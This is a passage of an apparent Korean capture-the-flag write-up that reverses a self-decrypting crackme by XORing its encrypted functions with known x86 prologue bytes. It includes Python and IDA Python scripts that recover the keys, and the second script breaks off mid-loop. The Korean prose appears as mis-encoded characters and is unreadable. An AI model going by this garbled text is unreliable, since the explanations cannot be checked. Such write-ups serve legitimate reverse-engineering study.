&lt;/p&gt;&lt;ul id=&quot;732c508e-2344-44f3-885e-15e9b45bbe92&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;Hot Patchingì— ì‚¬ìš©í•  5ë°”ì´íŠ¸ &lt;code&gt;0x66 0x90 0x55 0x8B 0xEC&lt;/code&gt; ë¥¼ í†µí•´, ì…ë ¥ ê°’ì„ êµ¬í•  ìˆ˜ ìˆë‹¤.
&lt;strong&gt;apple &lt;/strong&gt;&lt;mark class=&quot;highlight-blue&quot;&gt;&lt;code&gt;0x61 0x70 0x70 0x6C 0x65&lt;/code&gt;&lt;/mark&gt;&lt;code&gt;=&lt;/code&gt;&lt;mark class=&quot;highlight-teal&quot;&gt;&lt;code&gt;0x07 0xE0 0x25 0xE7 0x89&lt;/code&gt;&lt;/mark&gt;&lt;mark class=&quot;highlight-yellow&quot;&gt;&lt;strong&gt;&lt;code&gt;Xor&lt;/code&gt;&lt;/strong&gt;&lt;/mark&gt;&lt;code&gt;0x66 0x90 0x55 0x8B 0xEC&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;9e6783cd-d44e-45e7-ab9c-2e4708ff8f35&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/07_apple.png&quot;&gt;&lt;img style=&quot;width:499px&quot; src=&quot;/assets/bob/07_apple.png&quot;/&gt;&lt;/a&gt;&lt;figcaption&gt;                                          [ê·¸ë¦¼ 7] apple ì…ë ¥ í›„ í™”ë©´&lt;/figcaption&gt;&lt;/figure&gt;&lt;ul id=&quot;225bd3d8-0c6c-496f-9ada-54c7983373c4&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;appleì„ ì…ë ¥í•˜ë‹ˆ ë˜ ë‹¤ì‹œ ì…ë ¥ì„ ë°›ëŠ”ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;6e3e91bd-22db-430b-b31f-20b1ed2dc26d&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/08_code.png&quot;&gt;&lt;img style=&quot;width:608px&quot; src=&quot;/assets/bob/08_code.png&quot;/&gt;&lt;/a&gt;&lt;figcaption&gt;                                          [ê·¸ë¦¼ 8] Xor ì—°ì‚° í›„ 0x4010D0 ë””ìŠ¤ì–´ì…ˆë¸” ê²°ê³¼&lt;/figcaption&gt;&lt;/figure&gt;&lt;ul id=&quot;95ac8f51-7eea-4e24-8cb0-d4b5437c4633&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;Xor ì—°ì‚°ì„ ìˆ˜í–‰í•œ 0x4010D0 ë¶€ë¶„ì˜ ì½”ë“œê°€ ì •ìƒì ìœ¼ë¡œ ë³´ì¸ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;fb23462d-1e20-4c6f-974f-45fe65eb21da&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;figure id=&quot;1b6b2a02-32fd-450a-9f4e-5bdbb6921241&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/09_code2.png&quot;&gt;&lt;img style=&quot;width:640px&quot; src=&quot;/assets/bob/09_code2.png&quot;/&gt;&lt;/a&gt;&lt;figcaption&gt;                                               [ê·¸ë¦¼ 9] 0x4010D0 í•¨ìˆ˜ì˜ ì…ë ¥ ê°’ ì‚¬ìš©&lt;/figcaption&gt;&lt;/figure&gt;&lt;ul id=&quot;ca2eb4d6-c85e-4018-86b9-953ee6cb77ab&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ë‹¤ìŒ ì…ë ¥ ê°’ì˜ í¬ê¸°ëŠ” 5ì´ë©°, 0x4011A0 ì£¼ì†Œì™€ Xor ì—°ì‚°í•˜ëŠ” ê²ƒìœ¼ë¡œ ë³´ì¸ë‹¤.
ì—°ì‚°í•  í¬ê¸°ëŠ” 0x2C560(0x42D700 - 0x4011A0)ì´ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;56a540b1-e656-4665-af98-a347a0b7cde2&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;&lt;strong&gt;apple&lt;/strong&gt;ê³¼ ê°™ì€ ë°©ë²•ìœ¼ë¡œ ì…ë ¥ ê°’ &lt;strong&gt;mango&lt;/strong&gt;ë¥¼ êµ¬í•  ìˆ˜ ìˆë‹¤.
&lt;mark class=&quot;highlight-gray&quot;&gt;&lt;em&gt;&lt;strong&gt;*appleì„ ì…ë ¥ í›„ ë°”ë€ 0x4010A0 ~ 0x4010A4 ë²”ìœ„ì˜ ê°’ì„ ì‚¬ìš©í•´ì•¼í•œë‹¤.&lt;/strong&gt;&lt;/em&gt;&lt;/mark&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;c6928362-d948-455a-9ded-76d1c0374ec5&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ê°™ì€ ë°©ë²•ìœ¼ë¡œ ë‹¤ìŒ ì…ë ¥ ê°’ &lt;strong&gt;lemon&lt;/strong&gt;ì„ êµ¬í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;fe695799-36c5-40e5-82ea-b63814ed9652&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;figure id=&quot;f69472f2-90e4-4e2e-b60e-5806d11e1ce3&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/10_code3.png&quot;&gt;&lt;img style=&quot;width:647px&quot; src=&quot;/assets/bob/10_code3.png&quot;/&gt;&lt;/a&gt;&lt;figcaption&gt;                                              [ê·¸ë¦¼ 10] 0x401270 í•¨ìˆ˜ì—ì„œ 6ê¸€ì ì…ë ¥ ê°’ ìš”êµ¬ &lt;/figcaption&gt;&lt;/figure&gt;&lt;ul id=&quot;79683aec-7586-431d-afb2-aab7129d8ab0&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì„¸ ë²ˆì§¸ ì…ë ¥ ê°’ lemon ì´í›„ì—ëŠ” ì…ë ¥ ê°’ì´ 6ìœ¼ë¡œ ì¦ê°€í•œë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;b80003c6-9213-4528-bb6c-65abfaf4cfbc&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ê·¸ë˜ë„ ì•Œë ¤ì§„ 5ë°”ì´íŠ¸ë¥¼ í†µí•´ &lt;strong&gt;orang&lt;/strong&gt; 5ê¸€ìë¥¼ êµ¬í•  ìˆ˜ ìˆë‹¤.
ì´ì „ì— ê³¼ì¼ì´ ë‚˜ì™”ìœ¼ë¯€ë¡œ &lt;strong&gt;orange&lt;/strong&gt;ë¡œ ìœ ì¶”í•´ ë³¼ ìˆ˜ ìˆë‹¤.
ë˜í•œ  &lt;mark class=&quot;highlight-blue&quot;&gt;&lt;code&gt;sub&lt;/code&gt;&lt;/mark&gt;&lt;code&gt;&lt;mark class=&quot;highlight-pink&quot;&gt;esp&lt;/mark&gt;&lt;/code&gt;&lt;mark class=&quot;highlight-gray&quot;&gt;&lt;code&gt;,&lt;/code&gt;&lt;/mark&gt;&lt;mark class=&quot;highlight-teal&quot;&gt;&lt;code&gt;N&lt;/code&gt;&lt;/mark&gt;  ì½”ë“œì˜ &lt;code&gt;0x83 0xEC 0x??&lt;/code&gt; ë¥¼ í†µí•´ì„œ ì´ ìµœëŒ€ 7ê¸€ìë¥¼ êµ¬í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;f1a386c4-719a-4136-9a8c-0ca1b1e3e15a&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;figure id=&quot;05ec8e3f-eb06-4a2c-a5e4-c033f06bf8ca&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/11_flag.png&quot;&gt;&lt;img style=&quot;width:499px&quot; src=&quot;/assets/bob/11_flag.png&quot;/&gt;&lt;/a&gt;&lt;figcaption&gt;                                                [ê·¸ë¦¼ 11] Flag ì¶œë ¥&lt;/figcaption&gt;&lt;/figure&gt;&lt;ul id=&quot;cda11258-2765-4a9f-95c9-8ff5266d5ac9&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì•Œë ¤ì§„ 7ë°”ì´íŠ¸ì™€ ìœ ì¶”ë¥¼ í†µí•´ì„œ Keyë¥¼ ì´ 10ë²ˆ ì…ë ¥í•˜ë©´ Flagë¥¼ íšë“í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;pre id=&quot;d5806112-41dc-47f0-8714-bd7e4a5a317b&quot; class=&quot;code code-wrap&quot;&gt;&lt;code&gt;key_info = [
    {&amp;quot;addr&amp;quot;:0x4010D0, &amp;quot;size&amp;quot;:5, &amp;quot;data&amp;quot;:[0x07, 0xE0, 0x25, 0xE7, 0x89]},
    {&amp;quot;addr&amp;quot;:0x4011A0, &amp;quot;size&amp;quot;:5, &amp;quot;data&amp;quot;:[0x0B, 0xF1, 0x3B, 0xEC, 0x83]},
    {&amp;quot;addr&amp;quot;:0x401270, &amp;quot;size&amp;quot;:5, &amp;quot;data&amp;quot;:[0x0A, 0xF5, 0x38, 0xE4, 0x82]},
    {&amp;quot;addr&amp;quot;:0x401350, &amp;quot;size&amp;quot;:6, &amp;quot;data&amp;quot;:[0x09, 0xE2, 0x34, 0xE5, 0x8B, 0xE6]},
    {&amp;quot;addr&amp;quot;:0x401430, &amp;quot;size&amp;quot;:6, &amp;quot;data&amp;quot;:[0x04, 0xF1, 0x3B, 0xEA, 0x82, 0xE2]},
    {&amp;quot;addr&amp;quot;:0x401510, &amp;quot;size&amp;quot;:6, &amp;quot;data&amp;quot;:[0x02, 0xE5, 0x27, 0xE2, 0x8D, 0xED]},
    {&amp;quot;addr&amp;quot;:0x4015F0, &amp;quot;size&amp;quot;:7, &amp;quot;data&amp;quot;:[0x05, 0xE5, 0x27, 0xF9, 0x8D, 0xED, 0x98]},
    {&amp;quot;addr&amp;quot;:0x4016D0, &amp;quot;size&amp;quot;:7, &amp;quot;data&amp;quot;:[0x07, 0xE6, 0x3A, 0xE8, 0x8D, 0xE7, 0x83]},
    {&amp;quot;addr&amp;quot;:0x4017B0, &amp;quot;size&amp;quot;:7, &amp;quot;data&amp;quot;:[0x05, 0xFF, 0x36, 0xE4, 0x82, 0xF6, 0x98]},
    {&amp;quot;addr&amp;quot;:0x401890, &amp;quot;size&amp;quot;:8, &amp;quot;data&amp;quot;:[0x0B, 0xF1, 0x3B, 0xEF, 0x8D, 0xF1, 0x85, 0x4E]}
]

known_bytes = [0x66, 0x90, 0x55, 0x8B, 0xEC, 0x83, 0xEC]
for k in key_info:
    data = k[&amp;quot;data&amp;quot;]
    key = &amp;quot;&amp;quot;
    size = len(data)
    for i in range(size):
        key += chr(data[i] ^ known_bytes[i % 7])

    print(key[:5] + &amp;quot;?&amp;quot; * (size - 5), &amp;quot;=&amp;gt;&amp;quot;, key) #Known Bytes Size == 5, 7


&amp;quot;&amp;quot;&amp;quot; #Result
apple =&amp;gt; apple
mango =&amp;gt; mango
lemon =&amp;gt; lemon
orang? =&amp;gt; orange
banan? =&amp;gt; banana
duria? =&amp;gt; durian
curra?? =&amp;gt; currant
avoca?? =&amp;gt; avocado
cocon?? =&amp;gt; coconut
manda??? =&amp;gt; mandari? =&amp;gt; mandarin*
&amp;quot;&amp;quot;&amp;quot;&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;a853b5e4-a484-4510-b239-d8726314ad57&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;h2 id=&quot;df3280c0-969a-49cc-9676-84ad8f7a4a64&quot; class=&quot;&quot;&gt;Hot Patching 777&lt;/h2&gt;&lt;hr id=&quot;2b577b15-498e-4c16-b9bc-4ff613012d6e&quot;/&gt;&lt;figure id=&quot;b80f35bb-c88c-4402-8636-94f7c53a3493&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/hot_patching_2.png&quot;&gt;&lt;img style=&quot;width:794px&quot; src=&quot;/assets/bob/hot_patching_2.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class=&quot;block-color-gray_background callout&quot; style=&quot;white-space:pre-wrap;display:flex&quot; id=&quot;506b24c3-604b-4066-9a9e-d859bbdd03fd&quot;&gt;&lt;div style=&quot;font-size:1.5em&quot;&gt;&lt;span class=&quot;icon&quot;&gt;ğŸ’¡&lt;/span&gt;&lt;/div&gt;&lt;div style=&quot;width:100%&quot;&gt;ê³µí†µëœ ëª…ë ¹ ë°”ì´íŠ¸ë¥¼ í†µí•œ Key ì¶”ì¶œ ìë™í™” &lt;/div&gt;&lt;/figure&gt;&lt;ul id=&quot;8675e56c-50e6-453a-bf8a-bdd6add505b8&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì´ì „ &lt;strong&gt;Hot Patching&lt;/strong&gt; ë¬¸ì œëŠ” ë³„ë„ì˜ ìë™í™” ì—†ì´ ë¬¸ì œë¥¼ í•´ê²°í•  ìˆ˜ ìˆì—ˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;0dac0582-8a18-4986-988e-ec957f980b3c&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/12_flag_xor.png&quot;&gt;&lt;img style=&quot;width:651px&quot; src=&quot;/assets/bob/12_flag_xor.png&quot;/&gt;&lt;/a&gt;&lt;figcaption&gt;                                        [ê·¸ë¦¼ 1] 0x401890 í•¨ìˆ˜ì—ì„œ Flag ì¶œë ¥ í›„ ì—°ì‚° ë°ì´í„°&lt;/figcaption&gt;&lt;/figure&gt;&lt;ul id=&quot;189152bf-8afa-4ee7-b4c4-860fcefb8c68&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;0x401890 í•¨ìˆ˜ì—ì„œ ì²« ë²ˆì§¸ Flagë¥¼ ì¶œë ¥í•´ì£¼ê³ , ë‹¤ìŒ Flagë¥¼ ìœ„í•œ ì—°ì‚°ì´ ìˆ˜í–‰ëœë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;2924fe53-ed31-479b-95e8-1707104d7c91&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/13_11th_function.png&quot;&gt;&lt;img style=&quot;width:684px&quot; src=&quot;/assets/bob/13_11th_function.png&quot;/&gt;&lt;/a&gt;&lt;figcaption&gt;                             [ê·¸ë¦¼ 2] 0x401890 í•¨ìˆ˜ì—ì„œ ë³„ë„ ì…ë ¥ ì²˜ë¦¬ ì—†ì´ ë‹¤ìŒ í•¨ìˆ˜ ë³µí˜¸í™” ìˆ˜í–‰&lt;/figcaption&gt;&lt;/figure&gt;&lt;ul id=&quot;1577556a-30a2-4f8f-a3a9-d129076c519f&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;10 ë²ˆì§¸ Keyê¹Œì§€ ëª¨ë‘ ì˜¬ë°”ë¥´ê²Œ ì…ë ¥ëœ ê²½ìš°, ë‹¤ìŒ í•¨ìˆ˜ëŠ” ë³„ë„ ì…ë ¥ ì²˜ë¦¬ ì—†ì´ ë³µí˜¸í™” ëœë‹¤. &lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;5fd0afb5-29ad-4db8-a20f-62a74896ddea&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/14_length.png&quot;&gt;&lt;img style=&quot;width:644px&quot; src=&quot;/assets/bob/14_length.png&quot;/&gt;&lt;/a&gt;&lt;figcaption&gt;                                                [ê·¸ë¦¼ 3] 0x4019B0 í•¨ìˆ˜ì—ì„œ ì…ë ¥ ê°’ ê²€ì‚¬&lt;/figcaption&gt;&lt;/figure&gt;&lt;ul id=&quot;50f8cf6b-4ca8-4f42-a4e6-93425b10a2e9&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì²« ë²ˆì§¸ Flag ì¶œë ¥ ì´ì „ê¹Œì§€ëŠ” 5~8 ê¸€ìì˜ ì…ë ¥ ê°’ì´ í•„ìš”í–ˆì§€ë§Œ, 11 ë²ˆì§¸ëŠ” 17 ê¸€ìë¥¼ ìš”êµ¬í•œë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;d78fd124-3517-4ab7-86e2-1124653b1ff4&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì•Œë ¤ì§„ 7ë°”ì´íŠ¸ë¥¼ í†µí•´, ì¼ë¶€ë¥¼ ë³µêµ¬í•˜ì—¬ë„ ì´ì „ê³¼ ë‹¤ë¥´ê²Œ íŠ¹ì • ë‹¨ì–´ë¡œ ì¶”ì •í•  ìˆ˜ ì—†ë‹¤.
&lt;strong&gt;TO5yQyc &lt;/strong&gt;&lt;mark class=&quot;highlight-blue&quot;&gt;&lt;code&gt;0x54 0x4F 0x35 0x79 0x51 0x79 0x63
&lt;/code&gt;&lt;/mark&gt;&lt;mark class=&quot;highlight-blue&quot;&gt;            &lt;/mark&gt;&lt;code&gt;=&lt;/code&gt;&lt;mark class=&quot;highlight-teal&quot;&gt;&lt;code&gt;0x32 0xDF 0x60 0xF2 0xBD 0xFA 0x8F&lt;/code&gt;&lt;/mark&gt;&lt;mark class=&quot;highlight-yellow&quot;&gt;&lt;strong&gt;&lt;code&gt;Xor&lt;/code&gt;&lt;/strong&gt;&lt;/mark&gt;&lt;code&gt;0x66 0x90 0x55 0x8B 0xEC 0x83 0xEC&lt;/code&gt;
                                &lt;mark class=&quot;highlight-gray&quot;&gt; &lt;/mark&gt;&lt;mark class=&quot;highlight-gray&quot;&gt;&lt;strong&gt;&lt;em&gt;&amp;quot;ê·¸ë ‡ë‹¤ë©´, ì•Œë ¤ì§„ 7ë°”ì´íŠ¸ ì™¸ì— ë‹¨ì„œê°€ í•„ìš”í•˜ë‹¤.&amp;quot;&lt;/em&gt;&lt;/strong&gt;&lt;/mark&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;9f2ba1b9-d2de-4fbd-8668-41be4cb265c3&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;ul id=&quot;09890ce5-4989-4bde-999f-1f80e19db6a7&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì§€ê¸ˆê¹Œì§€ Flag ì¶œë ¥ í•¨ìˆ˜ ì™¸ ëª¨ë“  í•¨ìˆ˜ëŠ” ê°™ì€ í˜•ì‹ìœ¼ë¡œ êµ¬ì„±ë˜ì–´ìˆë‹¤.
ë‹¤ë¥¸ ì ì€ ì…ë ¥ ê°’ì˜ í¬ê¸°, ë³µí˜¸í™” ëŒ€ìƒ ì£¼ì†Œ, ë‹¤ìŒ í•¨ìˆ˜ ì£¼ì†Œ ë“±ì´ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;b2c5c3a4-e89e-4cdc-a9ce-edc1282eecbf&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/15_dummy.png&quot;&gt;&lt;img style=&quot;width:643px&quot; src=&quot;/assets/bob/15_dummy.png&quot;/&gt;&lt;/a&gt;&lt;figcaption&gt;                                             [ê·¸ë¦¼ 4] í•¨ìˆ˜ ì¤‘ê°„ ì¤‘ê°„ ì¡´ì¬í•˜ëŠ” ë”ë¯¸ì½”ë“œ&lt;/figcaption&gt;&lt;/figure&gt;&lt;ul id=&quot;627ed198-63aa-4436-b3ea-dce31431fb19&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;í•¨ìˆ˜ì˜ ë‚´ìš©ì€ ëª¨ë‘ ê°™ì§€ë§Œ, ì¤‘ê°„ ì¤‘ê°„ ë”ë¯¸ì½”ë“œê°€ í˜¼ë€ì„ ì£¼ê³  ìˆë‹¤.
ë”ë¯¸ì½”ë“œì˜ ì˜í–¥ì„ ë°›ì§€ ì•Šìœ¼ë©´ì„œ ê³µí†µëœ ì–´ì…ˆë¸”ë¦¬ ì½”ë“œë¥¼ ì°¾ì•„ì•¼í•œë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;774fc154-32ea-4d71-b6de-1f44e560a49e&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/16_common.png&quot;&gt;&lt;img style=&quot;width:644px&quot; src=&quot;/assets/bob/16_common.png&quot;/&gt;&lt;/a&gt;&lt;figcaption&gt;                                                     [ê·¸ë¦¼ 5] ê³µí†µëœ strlen ê¸°ëŠ¥ ì½”ë“œ&lt;/figcaption&gt;&lt;/figure&gt;&lt;ul id=&quot;0a322ebe-3ba7-41a8-8670-d7f663a91392&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;strlen ê¸°ëŠ¥ì˜ ì½”ë“œ ë•ë¶„ì— ë¬´ë ¤ 58ë°”ì´íŠ¸ì˜ ê³µí†µ ì½”ë“œë¥¼ ì°¾ì„ ìˆ˜ ìˆë‹¤.
&lt;mark class=&quot;highlight-gray&quot;&gt;&lt;em&gt;&lt;strong&gt;*ë§ˆì§€ë§‰ cmp ëª…ë ¹ì˜ ê¸€ììˆ˜(0x07) ë¹„êµ ì „ ê¹Œì§€ 58 ë°”ì´íŠ¸&lt;/strong&gt;&lt;/em&gt;&lt;/mark&gt;&lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;e0ba5397-89da-4e16-91a3-8a02f1940734&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/17_scan.png&quot;&gt;&lt;img style=&quot;width:725px&quot; src=&quot;/assets/bob/17_scan.png&quot;/&gt;&lt;/a&gt;&lt;figcaption&gt;                                                                       [ê·¸ë¦¼ 6] ê³µí†µ ì½”ë“œ ë©”ëª¨ë¦¬ ê²€ìƒ‰ ê²°ê³¼&lt;/figcaption&gt;&lt;/figure&gt;&lt;ul id=&quot;b8a7d81f-bb8f-4ed4-bd6d-61bf5aa6dfa2&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;í˜„ì¬ Flag ì¶œë ¥ ì™¸ 11ê°œ í•¨ìˆ˜ê°€ ë³µí˜¸í™”ë˜ì–´ìˆë‹¤. ê³µí†µ ì½”ë“œë¥¼ ê²€ìƒ‰í•œ ê²°ê³¼ ë˜í•œ 11ê°œë‹¤.
ì´ë¥¼ í™œìš©í•˜ì—¬ ì…ë ¥ ê°’ ì¶”ì¶œ ìë™í™”ë¥¼ ìˆ˜í–‰í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;d8844cf5-0971-47a3-bcef-2f496c4e3c88&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì•„ë˜ì™€ ê°™ì€ ë‚´ìš©ì„ í† ëŒ€ë¡œ ìë™í™” ì½”ë“œë¥¼ ì‘ì„±í•˜ì˜€ë‹¤.&lt;ol id=&quot;9ca8257e-5540-47c2-9a6b-0a963e132070&quot; class=&quot;numbered-list&quot; start=&quot;1&quot;&gt;&lt;li&gt;ë””ìŠ¤ì–´ì…ˆë¸”ëŸ¬ë¥¼ í†µí•´, cmp ëª…ë ¹ì–´ì—ì„œ ë¹„êµí•  ì…ë ¥ ê°’ì„ êµ¬í•œë‹¤.&lt;/li&gt;&lt;/ol&gt;&lt;ol id=&quot;d22b7fa3-ad40-40c0-88ec-0adb673e309d&quot; class=&quot;numbered-list&quot; start=&quot;2&quot;&gt;&lt;li&gt;ì´í›„ sub ëª…ë ¹ì–´ì—ì„œ Xor ì—°ì‚° ì‹œì‘ ì£¼ì†Œë¥¼ êµ¬í•œë‹¤.&lt;/li&gt;&lt;/ol&gt;&lt;ol id=&quot;d72254cc-a3a5-4be6-a257-4c391e8b88b1&quot; class=&quot;numbered-list&quot; start=&quot;3&quot;&gt;&lt;li&gt;ì•Œë ¤ì§„ 5ë°”ì´íŠ¸ë¥¼ í†µí•´, ì…ë ¥ ê°’ì˜ ì²« 5ê¸€ìë¥¼ íšë“í•œë‹¤.&lt;/li&gt;&lt;/ol&gt;&lt;ol id=&quot;1d9ae61d-1643-4f0a-a57d-a7cac8f65caf&quot; class=&quot;numbered-list&quot; start=&quot;4&quot;&gt;&lt;li&gt;ì²« 5ê¸€ìë¥¼ íŒ¨ì¹˜ ëŒ€ìƒ ë°ì´í„°ì™€ Xor ì—°ì‚°í•˜ê³ , ê³µí†µ ì½”ë“œ 58ë°”ì´íŠ¸ì— í¬í•¨ë˜ëŠ”ì§€ í™•ì¸í•œë‹¤.&lt;/li&gt;&lt;/ol&gt;&lt;ol id=&quot;be0b13bc-e92d-4e55-b3fd-1fe2a38dc4b5&quot; class=&quot;numbered-list&quot; start=&quot;5&quot;&gt;&lt;li&gt;í¬í•¨ë  ê²½ìš° ì…ë ¥ ê°’ì„ ì¶”ì¶œí•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ol&gt;&lt;ol id=&quot;1cb51f5f-0273-4e6d-b6fc-c0ae75fa070f&quot; class=&quot;numbered-list&quot; start=&quot;6&quot;&gt;&lt;li&gt;ë””ìŠ¤ì–´ì…ˆë¸”ëŸ¬, ì½”ë“œ íŒ¨ì¹˜ ê¸°ëŠ¥ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆëŠ” IDA Pythonì„ ì‚¬ìš©í•˜ì—¬ ì‘ì„±í•œë‹¤.&lt;/li&gt;&lt;/ol&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;6c02958a-ab31-4c80-a165-cd674ad623c6&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;pre id=&quot;73551061-6f38-4753-8281-5004d5de56db&quot; class=&quot;code code-wrap&quot;&gt;&lt;code&gt;import struct
p32 = lambda x:struct.pack(&amp;quot;&amp;lt;L&amp;quot;, x)

# patch_xor : Xor ì—°ì‚°ì„ í†µí•´ íŒ¨ì¹˜ë¥¼ ìˆ˜í–‰í•˜ëŠ” í•¨ìˆ˜
def patch_xor(addr_patch, addr_end, xor_key):
    size_patch = addr_end - addr_patch
    for i in range(size_patch):
        cur = addr_patch + i
        idc.PatchByte(cur, idc.Byte(cur) ^ xor_key[i % len(xor_key)])
        # Xor ì—°ì‚°í•œ ë°ì´í„°ë¥¼ íŒ¨ì¹˜í•˜ì—¬ ë°˜ì˜
        idc.MakeUnknown(cur, 1, idc.DOUNK_SIMPLE)
        # íŒ¨ì¹˜ í›„ Unknown í˜•íƒœë¡œ ë³€í™˜í•˜ì—¬ ì˜ëª»ëœ ë””ìŠ¤ì–´ì…ˆë¸”ë¦¬ ë°©ì§€
    return

# xor_data : ë‹¨ìˆœ Xor í•¨ìˆ˜
def xor_data(addr_xor, addr_end, xor_key):
    result = []
    size_xor = addr_end - addr_xor
    for i in range(size_xor):
        cur = addr_xor + i
        result.append(idc.Byte(cur) ^ xor_key[i % len(xor_key)])
    return result

addr_start = 0x401000   # í•¨ìˆ˜ ì‹œì‘ ì£¼ì†Œ
addr_end = 0x42D700     # í•¨ìˆ˜ ë§ˆì§€ë§‰ ì£¼ì†Œ, ê¸¸ì´ ê³„ì‚°ì— ì‚¬ìš©

cnt = 0
keys = []

cur = addr_start
while cur &amp;lt; addr_end:   # ë””ìŠ¤ì–´ì…ˆë¸”ë¦¬ë¥¼ í†µí•´ Key í¬ê¸°, íŒ¨ì¹˜ ì£¼ì†Œë¥¼ êµ¬í•¨
    key_size = 0
    addr_patch = 0
    while cur &amp;lt; addr_end:
        try:
            dis = idc.GetDisasm(cur)
            if dis.find(&amp;quot;retn&amp;quot;) != -1:
                break
            # cmp ëª…ë ¹ì–´ì—ì„œ Key í¬ê¸° ì¶”ì¶œ
            if dis.find(&amp;quot;cmp&amp;quot;) != -1 and dis.find(&amp;quot;], 0&amp;quot;) == -1:
                tmp = dis.split(&amp;quot;, &amp;quot;)[1]
                if tmp.find(&amp;quot;h&amp;quot;) != -1:
                    key_size = int(tmp[:-1], base=16)
                else:
                    key_size = int(tmp)
            # sub ëª…ë ¹ì–´ì—ì„œ íŒ¨ì¹˜ ì£¼ì†Œ ì¶”ì¶œ
            if dis.find(&amp;quot;sub&amp;quot;) != -1 and dis.find(&amp;quot;offset&amp;quot;) != -1:
                tmp = dis.split(&amp;quot;_&amp;quot;)[1].replace(&amp;quot; &amp;quot;, &amp;quot;&amp;quot;)
                if tmp.find(&amp;quot;;&amp;quot;) != -1:
                    tmp = tmp.split(&amp;quot;;&amp;quot;)[0]
                addr_patch = int(tmp, base=16)
            cur += idc.ItemSize(cur)
        except:
            break
            
    print cnt, key_size, hex(addr_patch),
    
    # Flag ì¶œë ¥ í•¨ìˆ˜ì˜ ê²½ìš° ì„ì˜ë¡œ Keyì„ ìˆ˜ì •
    if cnt == 10:
        key_size = 32
        
        tmp = p32(0x454D4E4A)
        tmp += p32(0x07692B4B)
        tmp += p32(0x2D0C1A2C)
        tmp += p32(0x0E0D100A)
        tmp += p32(0x09090476)
        tmp += p32(0x26065966)
        tmp += p32(0x1C103417)
        tmp += p32(0x567C2075)
        
        prev_key = xor_key[::]
        xor_key = []
        for i in range(key_size):
            xor_key.append(ord(tmp[i]) ^ prev_key[i % len(prev_key)])
    
    # ì—°ì‚° ì˜¤ë¥˜ê°€ ìˆì„ ì‹œ break
    if key_size == 0 or addr_patch == 0:
        break
    
    # Flag ì¶œë ¥ í•¨ìˆ˜ê°€ ì•„ë‹Œ ê²½ìš°, Key ì¶”ì¶œ ìˆ˜í–‰
    if key_size != 32:
        known_data = [0x66, 0x90, 0x55, 0x8B, 0xEC] # ì•Œë ¤ì§„ Hot Patching 5ë°”ì´íŠ¸
        xor_key = []
        # Hot Patching 5ë°”ì´íŠ¸ë¥¼ í†µí•´, Key ì²« 5ê¸€ì ì¶”ì¶œ
        for i in range(5):
            xor_key.append(idc.Byte(addr_patch + i) ^ known_data[i])
        
